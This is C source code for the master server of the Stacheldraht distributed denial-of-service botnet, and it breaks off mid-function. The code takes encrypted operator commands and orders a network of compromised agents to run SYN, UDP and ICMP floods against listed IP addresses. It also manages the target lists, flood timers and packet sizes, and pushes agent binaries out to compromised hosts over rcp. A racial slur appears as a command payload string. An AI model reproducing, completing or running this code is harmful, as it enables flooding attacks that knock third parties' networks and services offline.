#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <time.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include "tubby.h"
#include "config.h"
#include "blowfish.h"

extern int errno;


/* salt generated with crypt */
#define SALT "dRFWfIGlF0zrE\0"

/* port the masterserver listens on */
#define   MSERVERPORT 65512

#define   SERVVERSION "[*]stacheldraht[*] mserver version: 4.0\n" 

/* masterserver handles up to 6000 bcasts */
#define     MAXBCASTS 6000
/* name of the encrypted bcast file */
#define BCASTFILENAME ".bc"
/* local ip , the masterserver won't work on any other ip*/
#define LOCALIP "193.116.54.15"

/* how many times a message gets send */
#define MAXROUNDS 10
/* port floodserver waits for the ping */
#define COMMANDPORT 65513
/* seconds to wait for the next status request */
#define SREQUEST 5*60

/* seconds to wait till it terminates the idle connection */
#define MAXWAIT (60*20)


#define CURPROMPT "stacheldraht"

#define SYN        1
#define UDP        2
#define ICMP       3 
#define SPOOFWAIT  5

struct ippkt
{
 struct ip ipi;
 struct icmp icmpi;
 char buffer[1024];
}pkt;

/* global variables */
/* icmp size of the packets */
int icmpsize = 1024;
/* udp size */
int  udpsize = 1024;
 

int resolv = 1;
int flood  = 0;
int ptimer = 0;
int floodt = 0;
int trinoo = 0;

int pingtimer;
int endmtime;
int finishedloop;
int socki;
int count;
int bcasts[1000];
int tmpcasts[1000];
int bcastcount=0;
int publicfd;
int timetorun;
int roundcounti;
int childcount;
int pid;
int pids[200];
int pipee[2];


char text[200];

/* ips to hit */
char sendbuffer[500]; 
char tempbuffer[500];
char sendit[500];
char prompti[100];
int helpit;

struct in_addr amanda;

void mpingbcasts(int,int);
void massudp(int,char *);
void massstop(int,char *);
void massicmp(int,char *);
void masssyn(int,char *);
void mtimer(int,char *);
void madd(int,char *);
void mremove(int,char *);
void mlist(int);
void readinbcasts();
void writebcasts();
void decryptstuff(char *,char *,char *);
void encryptstuff(char *,char *,char *);
void masteradd(int,char *);
void masterremove(int,char *);
void distroall(int,char *);
void helpme(int,char *);
void mdos(int,char *);
void mdie(int,char *);
void setisize(int,char *);
void setusize(int,char *);
void sprange(int,char *);
void killall(int);

char *encrypt_string(char *, char *);
char *decrypt_string(char *, char *);


void ffprintf(char *stringi,int fd) {
 char encrypteddata[1024];
 char decrypteddata[1024];
 char *source;
 char *desti;
 int roundcounti;
 
 memset(encrypteddata,0,sizeof(encrypteddata));
 memset(decrypteddata,0,sizeof(encrypteddata));

 strcpy(decrypteddata,stringi);

 encryptstuff(decrypteddata,encrypteddata,SALT);
 write(fd,encrypteddata,sizeof(encrypteddata));
}

void decryptstuff(char *source,char *desti,char *key)
{
 strcpy(desti,(char*)decrypt_string(key,source));
}


void encryptstuff(char *source,char *desti,char *key)
{
 strcpy(desti,(char*)encrypt_string(key,source));
}

void setupfdroutine(int fd)
{
 char data[1024];
 char decrypteddata[1024];
 char crapdata[1024];
 fd_set fdset;
 struct timeval timi;
 char *source;
 char *desti;
 char *parseit;
 char *writeit;
 char *pointi;
 int left,readd,readit;
 int appendit;
 int idle=0;
 int checktime;


 readinbcasts();
 checktime=time(NULL)+MAXWAIT;

 pipe(pipee);
 mpingbcasts(fd,3);
 pingtimer=time(NULL)+SREQUEST;
 
 ffprintf(prompti,fd);
 timi.tv_sec=1;
 timi.tv_usec=0;

 while (1) {
  idle=1;
  FD_ZERO(&fdset);

  if (time(NULL) > pingtimer) {
   mpingbcasts(fd,3);
   pingtimer=time(NULL)+SREQUEST;
  }

  if (endmtime!=0) {
   if (time(NULL) > endmtime) { 
    ffprintf("\n* mtimer reached *\n",publicfd);
    endmtime=0;
    flood=0;
    ffprintf(prompti,fd);  
   }
  }

  /* without this crap it would take like 96,x% of the cpu time ;( */
  usleep(200);
  /* we need stdin connected to our leeto socket */
  FD_SET(0,&fdset);  
  /* leet0 network socket */
  FD_SET(fd,&fdset);
  select(FD_SETSIZE,&fdset,NULL,NULL,&timi);

  memset(data,0,sizeof(data));
   
  /* check if socket state changed */
  if (FD_ISSET(fd,&fdset))
  {
   readinbcasts();
   memset(decrypteddata,0,sizeof(decrypteddata));  

/*   idle=0;
   readd=0;   
   readit=0;
   pointi=(char*)&decrypteddata;
   left=sizeof(decrypteddata);

   while (readit!=sizeof(decrypteddata)) {
    readd=read(fd,pointi,left);
    left=sizeof(decrypteddata)-readd;
    readit=readit+readd;
    pointi=pointi+readd;
   } */
   read(fd,decrypteddata,sizeof(decrypteddata));

   decryptstuff(decrypteddata,data,SALT);

   if (strncmp(data,".quit",strlen(".quit"))==0) {
    if (flood==0) {
     ffprintf("exiting...\n",fd);
     exit(0);
    }
    ffprintf("you need to stop the packet action first.\n",fd);
   }

   parseit=(char*)&data;
   if (strncmp(data,".help",strlen(".help"))==0) {
    memset(crapdata,0,sizeof(crapdata));
    helpit=1;
    if (strlen(data)==6) helpme(fd,data);
    else {
     writeit=(char*)&crapdata;
     parseit=parseit+6;
     while (*parseit==' ') parseit++;
     strcpy(data,parseit);
    } 
   }

   if (strncmp(data,".version",strlen(".version"))==0) ffprintf(SERVVERSION,fd);
   if (bcastcount!=0) {
    if (strstr(data,"setusize")!=NULL) setusize(fd,data);
    if (strstr(data,"setisize")!=NULL) setisize(fd,data);
    if (strstr(data,"die")!=NULL) mdie(fd,data);
    if (strstr(data,"mdos")!=NULL) mdos(fd,data);
    if (strstr(data,"mping")!=NULL) mpingbcasts(fd,1);
    if (strstr(data,"mudp")!=NULL) massudp(fd,data);
    if (strstr(data,"micmp")!=NULL) massicmp(fd,data);
    if (strstr(data,"msyn")!=NULL) masssyn(fd,data);
    if (strstr(data,"mstop")!=NULL) massstop(fd,data);
    if (strstr(data,"mtimer")!=NULL) mtimer(fd,data);
    if (strstr(data,"madd")!=NULL) madd(fd,data);
    if (strstr(data,"mlist")!=NULL) mlist(fd);
    if (strstr(data,"msort")!=NULL) mpingbcasts(fd,2);
    if (strstr(data,"msadd")!=NULL) masteradd(fd,data);
    if (strstr(data,"msrem")!=NULL) masterremove(fd,data);
    if (strstr(data,"distro")!=NULL) distroall(fd,data);
    if (strstr(data,"sprange")!=NULL) sprange(fd,data);
    if (strstr(data,"killall")!=NULL) killall(fd);
    if (strstr(data,"showdead")!=NULL) mpingbcasts(fd,4);
    if (strstr(data,"showalive")!=NULL) mpingbcasts(fd,5);
   }
   if (bcastcount==0) ffprintf("add some bcasts mofo.\n",fd); 
   helpit=0;
   ffprintf(prompti,fd);
  }
  if (time(NULL) > checktime) {
   if (idle==1) exit(0);
   else checktime=time(NULL)+MAXWAIT;
  }
 }
}


void killall(int fd)
{
 int counti;
 
 ffprintf("killing all active childs...\n",fd);
 counti=0;
 while (pids[counti]!=0) {
  kill(pids[counti],SIGKILL);
  counti++;
 }
}

void sprange(int fd,char *buffer)
{
 char *savi;
 char *pointi;
 int ports[2];

 if (strlen(buffer)<=10) {
  ffprintf("usage: .sprange <lowport-highport>\n",fd);
  ffprintf("example: .sprange 0-140\n",fd);
  return;
 }

 savi=buffer;
 while (*savi!=' ') savi++;
 while (*savi==' ') savi++;
 pointi=strtok(savi,"-");
 ports[0]=htonl(atoi(pointi));
 pointi=strtok(NULL,"-");
 ports[1]=htonl(atoi(pointi));
 sprintf(text," low port is : %i\n",ntohl(ports[0]));
 ffprintf(text,fd);
 sprintf(text,"high port is : %i\n",ntohl(ports[1]));
 ffprintf(text,fd);
 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_SETPRANGE,(char*)&ports[0],sizeof(ports));
 }
 ffprintf("request was sent to the network.\n",fd);

}

void setusize(int fd,char *buffer)
{
 char *savi;

 if (strlen(buffer)<=10) {
  ffprintf("usage: .setusize <udp packet size (<=1024)>\n",fd);
  sprintf(text,"current udp packet size is %ibytes\n",udpsize);
  ffprintf(text,fd);
  return;
 }

 while (*buffer!=' ') buffer++;
 buffer++;
 while (*buffer==' ') buffer++;
 savi=buffer;
 while (1) {
  if (*savi=='\0') break;
  if ((*savi==13) || (*savi==10)) {
   *savi=0;
   break;
  }
  savi++;
 }

 udpsize=htonl(atoi(buffer));
 if (ntohl(udpsize)<=1024) {
   for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
    for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_SETUSIZE,(char*)&udpsize,4);
   }

   sprintf(text,"udp packet size was set to %i bytes.\n",ntohl(udpsize));
   ffprintf(text,fd);
   return;
 }
 ffprintf("udp packet size is too large.\n",fd);


}

void setisize(int fd,char *buffer)
{
 char *savi;
 FILE *fili;

 if (strlen(buffer)<=10) {
  ffprintf("usage: .setisize <icmp packet size (<=1024)>\n",fd);
  sprintf(text,"current icmp packet size is %ibytes\n",icmpsize);
  ffprintf(text,fd);
  return;
 }

 while (*buffer!=' ') buffer++;
 buffer++;
 while (*buffer==' ') buffer++;
 savi=buffer;

 while (1) {
  if (*savi=='\0') break;
  if ((*savi==13) || (*savi==10)) {
   *savi=0;
   break;
  }
  savi++;
 }

 icmpsize=htonl(atoi(buffer));

 if (ntohl(icmpsize)<=1024) {
  for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
   for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_SETISIZE,(char*)&icmpsize,4);
  }
  sprintf(text,"icmp packet size was set to %i bytes.\n",ntohl(icmpsize));
  ffprintf(text,fd);
  return;
 }
 ffprintf("icmp packet size is too large.\n",fd); 
}


void mdie(int fd,char *data)
{
 char crapi[100];
 
 ffprintf("sending mass die request...\n",fd);
 for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_DIEREQ,crapi,strlen(crapi));
 ffprintf("finished.\n",fd);
}



void mdos(int fd,char *data)
{

 if (trinoo) {
  if (data[0]=='.') memcpy(data,".mudp",5);
  else memcpy(data,"mudp",4);
  return;   
 }

 ffprintf("starting trinoo emulation...\n",fd);
 ffprintf("removing useful commands.\n",fd);
 ffprintf("- DONE - \n",fd);
 trinoo=1;
 mpingbcasts(fd,3);
 pingtimer=time(NULL)+SREQUEST;
}

void helpme(int fd,char *data)
{
 ffprintf("available commands in this version are:\n",fd);
 ffprintf("--------------------------------------------------\n",fd);
 ffprintf(".mtimer   .mudp     .micmp .msyn    .msort  .mping\n",fd);
 ffprintf(".madd     .mlist    .msadd .msrem   .distro .help\n",fd);
 ffprintf(".setusize .setisize .mdie  .sprange .mstop  .killall\n",fd);
 ffprintf(".showdead .showalive\n",fd);
 ffprintf("--------------------------------------------------\n",fd);
}

void distroall(int fd, char *buffer)
{
 char *savi;
 char *pointi;
 char *usi;
 int mip;
 struct hostent *hostenti;
 char user[100];
 char crapi[200];
 char *craptosend;
 FILE *fili;

 
 if (strlen(buffer)<=8) {
  ffprintf("usage: .distro <user> <server that runs rcp>\n",fd);
  return;
 }

 craptosend=(char*)&crapi;

 pointi=(char*)&user;
 savi=buffer;

 while (*savi!=' ') savi++;
 savi++; 
 
 while (*savi!=' ') {
  *craptosend++=*savi;
  *pointi++=*savi++;
 }
 *craptosend=' ';
 *pointi=0;
 craptosend++;
 savi++;

 while (*savi==' ') savi++;

 pointi=savi;
 while (1) {
  if (*savi=='\0') break;
  if ((*savi==13) || (*savi==10)) {
   *savi=0;
   break;
 }
  savi++;
 } 

 ffprintf("remember  : the distro files need to be executable!\n",fd);
 ffprintf("that means: chmod +x linux.bin , chmod +x sol.bin ;))\n",fd);
 ffprintf("sending distro request to all bcasts....\n",fd);
 sprintf(text,"      user : %s\n",user);
 ffprintf(text,fd);
 ffprintf("rcp server : ",fd);

 if (resolv) hostenti=gethostbyname(pointi);
 if (resolv) {
  if (!hostenti) {
   sprintf(text,"unable to resolve - %s\n",pointi);
   ffprintf(text,fd);
   ffprintf("unable to send distro request.\n",fd);
   return;
  }
  else {
   mip=*(unsigned long*)hostenti->h_addr;
   amanda.s_addr=*(unsigned long*)hostenti->h_addr;
   sprintf(text,"%s\n",(char*)inet_ntoa(amanda));
   strcpy(craptosend,inet_ntoa(amanda));
   ffprintf(text,fd);
  }
 }
 else {
  sprintf(text,"%s\n",pointi);
  ffprintf(text,fd);
  mip=inet_addr(pointi);
  strcpy(craptosend,(char*)inet_addr(pointi));
 }

 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_DISTROIT,crapi,strlen(crapi));
 }

 ffprintf("request was sent, wait some minutes ;) \n",fd);
}

void masterremove(int fd,char *buffer)
{
 char *savi;
 char *pointi;
 int mip;
 struct hostent *hostenti;

 if (strlen(buffer)<=7) {
  ffprintf("usage: .msrem <masterserver>\n",fd);
  return;
 }

savi=buffer;

 while (1) {
  if (*savi=='\0') break;
  if ((*savi==13) || (*savi==10)) {
   *savi=0;
   break;
 }
  savi++;
 }
 pointi=buffer;
 while (*pointi!=' ') pointi++;
 pointi++;
 ffprintf("removing masterserver - ",fd);
 if (resolv) hostenti=gethostbyname(pointi);
 if (resolv) {
  if (!hostenti) {
   sprintf(text,"unable to resolve - %s\n",pointi);
   ffprintf(text,fd);
   ffprintf("failed.\n",fd);
   return;
  }
  else {
   mip=*(unsigned long*)hostenti->h_addr;
   amanda.s_addr=*(unsigned long*)hostenti->h_addr;
   sprintf(text,"%s\n",(char*)inet_ntoa(amanda));
   ffprintf(text,fd);
  }
 }
 else {
  sprintf(text,"%s\n",pointi);
  ffprintf(text,fd);
  mip=inet_addr(pointi);
 }
 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_REMMSERVER,(char*)&mip,4);
 }
}

void masteradd(int fd,char *buffer)
{
 char *savi;
 char *pointi;
 int mip;
 struct hostent *hostenti;

 if (strlen(buffer)<=7) {
  ffprintf("usage: .msadd <masterserver>\n",fd);
  return;
 } 
 
 savi=buffer;

 while (1) {
  if (*savi=='\0') break;
  if ((*savi==13) || (*savi==10)) {
   *savi=0;
   break;
  }
  savi++;
 }
 pointi=buffer;
 while (*pointi!=' ') pointi++;
 pointi++;  
 ffprintf("adding masterserver - ",fd);
 if (resolv) hostenti=gethostbyname(pointi);
 if (resolv) {
  if (!hostenti) {
   sprintf(text,"unable to resolve - %s\n",pointi);
   ffprintf(text,fd);
   ffprintf("failed.\n",fd);
   return;
  }
  else {
   mip=*(unsigned long*)hostenti->h_addr;
   amanda.s_addr=*(unsigned long*)hostenti->h_addr;
   sprintf(text,"%s\n",(char*)inet_ntoa(amanda));
   ffprintf(text,fd);
  }
 }
 else {
  sprintf(text,"%s\n",pointi);
  ffprintf(text,fd);
  mip=inet_addr(pointi);
 }
 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_ADDMSERVER,(char*)&mip,4);
 }
}

void mlist(int fd)
{
 char *savi;
 int hitcounter;

 if (helpit) return;

 if (flood==0) {
  ffprintf("no packet action at the moment, sir.\n",fd);
  return;
 }

 ffprintf("the followings ip(s) are getting packeted...\n",fd);
 ffprintf("--------------------------------------------\n",fd);

 savi=(char*)&sendbuffer;
 hitcounter=0;
 while (*(int*)savi!=0) {
  amanda.s_addr=*(int*)savi;
  sprintf(text,"%s\n",(char*)inet_ntoa(amanda));
  ffprintf(text,fd);
  savi=savi+4;
  hitcounter++;
 }
 ffprintf("--------------------------------------------\n",fd);
 if (hitcounter>1) sprintf(text,"[*] stacheldraht [*] is packeting %d ips\n",hitcounter);
 else sprintf(text,"[*] stacheldraht [*] is packeting 1 ip\n");

 ffprintf(text,fd); 
}


void mremove(int fd,char *buffer)
{
 char *pointi;
 char *savi;
 char *savi2;
 char *saveadd;
 char *PARAM;
 int floodcount;
 int counti;
 int dontadd;
 int hitcounter;
 int removed;
 int tempi;
 struct hostent *hostenti;
 

 if (flood==0) {
  ffprintf("no packet action at the moment, sir.\n",fd);
  return;
 }

 counti=0;

 buffer=buffer+6;
 while (*buffer==' ') buffer++;

 savi2=(char*)&sendbuffer;
 saveadd=(char*)&tempbuffer;

 memset(saveadd,0,sizeof(tempbuffer));

 hitcounter=0;
 while (*(int*)savi2!=0) {
  savi2=savi2+4;
  hitcounter++; 
 }

 savi2=(char*)&sendbuffer;
 if (hitcounter==1) {
  massstop(fd,".mstop all");
  return;
 }

 ffprintf("deleting from packetlist...\n",fd);

 counti=0;

 PARAM=buffer;
 while (((pointi=strtok(PARAM,":"))!=NULL)) {
  PARAM=NULL;
  dontadd=0;
  savi=pointi;
  while (1) {
   if (*savi=='\0') break;
   if ((*savi==13) || (*savi==10)) {
    *savi=0;
    break;
   }
   savi++;
  }
  if (resolv) hostenti=gethostbyname(pointi);
  if (resolv) {
   if (!hostenti) { 
    sprintf(text,"unable to resolve - %s\n",pointi);
    ffprintf(text,fd);
   }
   else {

    savi2=(char*)&sendbuffer;
    removed=0;
    while (*(int*)savi2!=0) {
     dontadd=0;
     if (*(int*)savi2==*(unsigned long*)hostenti->h_addr) dontadd=1;

     if (dontadd==0) {
      *(int*)saveadd=*(int*)savi2;
      saveadd=saveadd+4;
     }
     if (dontadd) {
      removed=1;
      amanda.s_addr=*(unsigned long*)hostenti->h_addr;
      sprintf(text,"%s - removed.\n",(char*)inet_ntoa(amanda));
      ffprintf(text,fd);
     } 
     savi2=savi2+4;
    }
    if (removed==0) {
     amanda.s_addr=*(unsigned long*)hostenti->h_addr;
     sprintf(text,"%s - skipped.\n",(char*)inet_ntoa(amanda));
     ffprintf(text,fd);
    } 
  }
 }
  else {
   savi2=(char*)&sendbuffer;
   while (*(int*)savi2!=0) {
    dontadd=0;
    if (*(int*)savi2==inet_addr(pointi)) {
     dontadd=1;
     amanda.s_addr=inet_addr(pointi);
    }
    if (dontadd==0) {
     *(int*)saveadd=*(int*)savi2;
     saveadd=saveadd+4;
     amanda.s_addr=inet_addr(pointi);
    }
    if (dontadd) {
     amanda.s_addr=*(unsigned long*)hostenti->h_addr;
     sprintf(text,"%s - removed.\n",(char*)inet_ntoa(amanda));
     ffprintf(text,fd);
    }
    savi2=savi2+4;
   }
  }
  floodcount++;
 }

 *(int*)saveadd=0;
 
 savi2=(char*)&sendbuffer;
 memcpy(sendbuffer,tempbuffer,sizeof(sendbuffer));
 
 savi2=(char*)&sendit;

 tempi=htonl(ptimer);
 *(int*)savi2=tempi;
 memcpy(savi2+4,sendbuffer,500);


 
 ffprintf("restarting packeting routines...\n",fd);

 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_STOPIT,"niggahbitch",strlen("niggahbitch"));
 }

 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  if (floodt==SYN) {

   for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_SENDSYN,savi2,sizeof(sendbuffer));
  }
  if (floodt==ICMP) {
   for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_ICMP,savi2,sizeof(sendbuffer));
  }
  if (floodt==UDP) {
   for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_SENDUDP,savi2,sizeof(sendbuffer));
  }
 }
 /* set internal flood variable */
 flood=1;
}

void madd(int fd, char *buffer)
{
 char *PARAM;
 char *pointi;
 char *savi;
 char *savi2;
 char *saveadd;
 int floodcount;
 int counti;
 int dontadd;
 struct hostent *hostenti;
 int tempi;

 if (strlen(buffer)<=6) {
  ffprintf("usage: .madd <ip1:ip2:ip3:ip4>\n",fd);
  return;
 }

 if (flood==0) {
  ffprintf("no packet action at the moment, sir.\n",fd);
  return;
 }

 counti=0;

 buffer=buffer+6;
 while (*buffer==' ') buffer++;

 savi2=(char*)&sendbuffer;
 saveadd=(char*)&sendbuffer;

 while (*(int*)saveadd!=0) saveadd=saveadd+4;

 ffprintf("adding to packetlist...\n",fd);

 counti=0;

 PARAM=buffer;
 while (((pointi=strtok(PARAM,":"))!=NULL)) {
  PARAM=NULL;
  dontadd=0;
  savi=pointi;
  while (1) {
   if (*savi=='\0') break;
   if ((*savi==13) || (*savi==10)) {
    *savi=0;
    break;
   }
   savi++;
  }

  if (resolv) hostenti=gethostbyname(pointi);
  if (resolv) {
   if (!hostenti) {
    sprintf(text,"unable to resolve - %s\n",pointi);
    ffprintf(text,fd);
   } 
   else {
    savi2=(char*)&sendbuffer;

    while (*(int*)savi2!=0) {
     if (*(int*)savi2==*(unsigned long*)hostenti->h_addr) {
      dontadd=1;
      amanda.s_addr=*(unsigned long*)hostenti->h_addr;
      sprintf(text,"%s - skipped.\n",(char*)inet_ntoa(amanda));
      ffprintf(text,fd);
     }
     savi2=savi2+4;
    }
    if (dontadd==0) {
     *(int*)saveadd=*(unsigned long*)hostenti->h_addr;
     saveadd=saveadd+4;
     amanda.s_addr=*(unsigned long*)hostenti->h_addr;
     sprintf(text,"%s - added.\n",(char*)inet_ntoa(amanda));
     ffprintf(text,fd);
    }
   }
  }
  else {
   savi2=(char*)&sendbuffer;
   dontadd=0;
   *(int*)savi2=inet_addr(pointi);
   while (*(int*)savi2!=0) {
    if (*(int*)savi2==inet_addr(pointi)) {
     dontadd=1;
     amanda.s_addr=inet_addr(pointi);
     sprintf(text,"%s - skipped.\n",(char*)inet_ntoa(amanda));
     ffprintf(text,fd);
    }
    savi2=savi2+4;
   }

   if (dontadd==0) {
     *(int*)saveadd=inet_addr(pointi);
     saveadd=saveadd+4;
     amanda.s_addr=inet_addr(pointi);
     sprintf(text,"%s - added.\n",(char*)inet_ntoa(amanda));
     ffprintf(text,fd);
    }
  }
  floodcount++;
  savi2=savi2+4;
 }

 *(int*)savi2=0;
// savi2=(char*)&sendbuffer;

 savi2=(char*)&sendit;
 tempi=htonl(ptimer);
 *(int*)savi2=tempi;
 memcpy(savi2+4,sendbuffer,500);


 ffprintf("restarting packeting routines...\n",fd);
 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_STOPIT,"niggahbitch",strlen("niggahbitch"));
 }
 
 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  if (floodt==SYN) {
   for (count=0;count<bcastcount;count++)  send_connect(bcasts[count],ID_SENDSYN,savi2,sizeof(sendbuffer));
  }
  if (floodt==ICMP) {
   for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_ICMP,savi2,sizeof(sendbuffer));
  } 
  if (floodt==UDP) {
   for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_SENDUDP,savi2,sizeof(sendbuffer));
  }
 }
 /* set internal flood variable */
 flood=1;
}

void mtimer(int fd, char *buffer)
{
 char *savi;

 if (strlen(buffer)<=8) {
  ffprintf("usage: .mtimer <seconds to packet>\n",fd);
  return;
 }

 buffer=buffer+7;
 while (*buffer==' ') buffer++;
 savi=buffer;
 while (1) {
  if (*savi=='\0') break;
  if ((*savi==13) || (*savi==10)) {
   *savi=0;
   break;
  }
  savi++;
 }

 ptimer=atoi(buffer);
 timetorun=ptimer;

/* for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_TIMESET,(char*)&timetorun,4);
  printf("%i\n",timetorun);
  fflush(stdout);
 } */

 sprintf(text,"packet timer was set to %d seconds\n",atoi(buffer));  
 ffprintf(text,fd); 
}


void massstop(int fd,char *buffer) 
{

 if (strlen(buffer)<=7) {
  ffprintf("usage: .mstop <all> or <ip1:ip2:ip3:ip4:ip5 etc..>\n",fd);
  return;
 }

 endmtime=0;
 if (strstr(buffer,"all")==NULL) {
  mremove(fd,buffer);
  return;
 } 

 if (flood==0) {
  ffprintf("no packet action at the moment, sir.\n",fd);
  return;
 }

 /* unset the internal flood variable */
 flood=0;
 floodt=0;

 count=0;
 for (roundcounti=0;roundcounti<50;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_STOPIT,"niggahbitch",strlen("niggahbitch"));
 }
 ffprintf("packeting stopped.\n",fd);
}


void masssyn(int fd,char *buffer)
{
 char *PARAM;
 char *pointi;
 char *savi;
 char *savi2;
 int floodcount;
 int counti;
 struct hostent *hostenti;
 int tempi;
 FILE *sickii;

 savi2=(char*)&sendbuffer;

 if (strlen(buffer)<=6) {
  ffprintf("usage: .msyn <ip1:ip2:ip3:ip4:ip5 etc..>\n",fd);
  return;
 }

 if (flood) {
  ffprintf("the net is already packeting.\n",fd);
  return;
 }

 floodt=SYN;
 memset((void*)&sendbuffer,0,sizeof(sendbuffer));

 if (ptimer!=0) endmtime=ptimer+time(NULL);

 while (*buffer!=' ') buffer++;
 buffer++;
 sprintf(text,"mass syn flooding\n");
 ffprintf(text,fd);

 floodcount=0;

 PARAM=buffer;
 while (((pointi=strtok(PARAM,":"))!=NULL)) {
  PARAM=NULL;
  savi=pointi;
  while (1) {
   if (*savi=='\0') break;
   if ((*savi==13) || (*savi==10)) {
    *savi=0;
    break;
   }
   savi++;
  }

  if (resolv) hostenti=gethostbyname(pointi);
//  ffprintf("packeting - ",fd);
  if (resolv) {
   if (!hostenti) {
    sprintf(text,"unable to resolve - %s\n",pointi);
    ffprintf(text,fd);
   }
 
   else {
    *(int*)savi2=*(unsigned long*)hostenti->h_addr;
    amanda.s_addr=*(unsigned long*)hostenti->h_addr;
/*    sprintf(text,"%s\n",(char*)inet_ntoa(amanda));
    ffprintf(text,fd); */
   }
  }
  else {
/*   sprintf(text,"%s\n",pointi);
   ffprintf(text,fd); */
   *(int*)savi2=inet_addr(pointi);
  } 
  floodcount++;
  savi2=savi2+4;
 }

 *savi2=0;

 savi2=(char*)&sendit;
 tempi=htonl(ptimer);
 *(int*)savi2=tempi;

 memcpy(savi2+4,sendbuffer,500);

 sprintf(text,"%i floodrequests were sent to %i bcasts.\n",floodcount,bcastcount);
 ffprintf(text,fd);
 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_SENDSYN,savi2,sizeof(sendbuffer));
 }
 /* set internal flood variable */
 flood=1;
}


void massicmp(int fd,char *buffer)
{
 char *PARAM;
 char *pointi;
 char *savi;
 char *savi2;
 int floodcount;
 int counti;
 struct hostent *hostenti;
 int tempi;

 savi2=(char*)&sendbuffer;

 if (strlen(buffer)<=7) {
  ffprintf("usage: .micmp <ip1:ip2:ip3:ip4:ip5 etc..>\n",fd);
  return;
 }

 if (flood) {
  ffprintf("the net is already packeting.\n",fd);
  return;
 }

 floodt=ICMP; 
 if (ptimer!=0) endmtime=ptimer+time(NULL);
 memset((void*)&sendbuffer,0,sizeof(sendbuffer));

 while (*buffer!=' ') buffer++;
 buffer++;
 sprintf(text,"mass icmp bombing\n");
 ffprintf(text,fd);
 floodcount=0;

 PARAM=buffer;
 while (((pointi=strtok(PARAM,":"))!=NULL)) {
  PARAM=NULL;
  savi=pointi;
  while (1) {
   if (*savi=='\0') break;
   if ((*savi==13) || (*savi==10)) {
    *savi=0;
    break;
   }
   savi++;
  }
  
  
  if (resolv) hostenti=gethostbyname(pointi);
/*  sprintf(text,"packeting - ");
  ffprintf(text,fd); */
  if (resolv) {
   if (!hostenti) {
    sprintf(text,"unable to resolve - %s\n",pointi);
    ffprintf(text,fd);
   }
   else {
    *(int*)savi2=*(unsigned long*)hostenti->h_addr;
    amanda.s_addr=*(unsigned long*)hostenti->h_addr;
 /*   sprintf(text,"%s\n",(char*)inet_ntoa(amanda));
    ffprintf(text,fd); */
   }
  }
  else {
 /*  sprintf(text,"%s\n",pointi);
   ffprintf(text,fd); */
   *(int*)savi2=inet_addr(pointi);
  }
 floodcount++;
  savi2=savi2+4;
 }

 *savi2=0;
 savi2=(char*)&sendit;

 tempi=htonl(ptimer);
 
 *(int*)savi2=tempi;

 memcpy(savi2+4,sendbuffer,500);
 sprintf(text,"%i floodrequests were sent to %i bcasts.\n",floodcount,bcastcount);
 ffprintf(text,fd);
 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_ICMP,savi2,sizeof(sendbuffer));
 }
 /* set internal flood variable */
 flood=1;
}

void massudp(int fd,char *buffer) 
{
 char *PARAM;
 char *pointi;
 char *savi;
 char *savi2;
 int floodcount;
 int counti;
 struct hostent *hostenti;
 int tempi;

 savi2=(char*)&sendbuffer;

 if (strlen(buffer)<=6) {
  ffprintf("usage: .mudp <ip1:ip2:ip3:ip4:ip5 etc..>\n",fd);
  return;
 } 

 if (flood) {
  ffprintf("the net is already packeting.\n",fd);
  return;
 }
 
 if (ptimer!=0) endmtime=ptimer+time(NULL);

 floodt=UDP;
 memset((void*)&sendbuffer,0,sizeof(sendbuffer));
 while (*buffer!=' ') buffer++;
 buffer++;

 sprintf(text,"mass udp bombing\n");
 ffprintf(text,fd);

 floodcount=0;

 PARAM=buffer;
 while (((pointi=strtok(PARAM,":"))!=NULL)) {
  PARAM=NULL;
  savi=pointi;
  while (1) {
   if (*savi=='\0') break;
   if ((*savi==13) || (*savi==10)) {
    *savi=0;
    break;
   }
   savi++;
  }

  if (resolv) hostenti=gethostbyname(pointi);
//  ffprintf("packeting - ",fd);

  if (resolv) {
   if (!hostenti) {
    sprintf(text,"unable to resolve - %s\n",pointi);
    ffprintf(text,fd);
   }
   else {
    *(int*)savi2=*(unsigned long*)hostenti->h_addr;
    amanda.s_addr=*(unsigned long*)hostenti->h_addr;
  /*  sprintf(text,"%s\n",(char*)inet_ntoa(amanda));
    ffprintf(text,fd); */
   }
  }
  else {
 /*  sprintf(text,"%s\n",pointi);
   ffprintf(text,fd); */
